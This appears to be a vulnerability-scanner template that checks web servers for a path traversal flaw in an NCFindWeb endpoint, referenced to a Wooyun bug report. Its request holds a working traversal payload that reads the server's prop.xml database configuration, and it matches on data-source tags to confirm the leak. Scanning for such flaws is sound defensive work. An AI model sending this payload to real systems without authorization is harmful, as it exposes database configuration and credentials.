id: "wooyun-path-traversal"
name: "Wooyun - Local File Inclusion"
severity: "high"
description: "Wooyun is vulnerable to local file inclusion."
tech:
  - "generic"
tags:
  - "lfi"
  - "wooyun"
  - "vuln"
reference: "https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148227.html"
spaExclusion: true
request:
  method: "GET"
  path: "/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "status"
    status:
      - 200
  - type: "word"
    part: "body"
    words:
      - "<DataSourceClassName>"
      - "</DataSourceClassName>"
    condition: "and"
